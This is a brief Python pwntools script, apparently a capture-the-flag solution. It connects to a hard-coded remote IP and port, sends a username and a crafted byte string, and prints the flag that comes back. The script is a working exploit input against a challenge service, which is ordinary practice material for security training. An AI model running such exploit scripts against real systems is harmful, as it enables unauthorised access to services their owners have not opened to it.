from pwn import *
context.log_level = 'warn'
p = remote('52.59.124.14',10100)
p.sendline(b'user')
p.sendline(b'\x01\x01\xc4')
p.recvuntil(b'Flag: ')
flag = p.recvuntil(b'}')
log.warn(flag.decode('utf-8'))
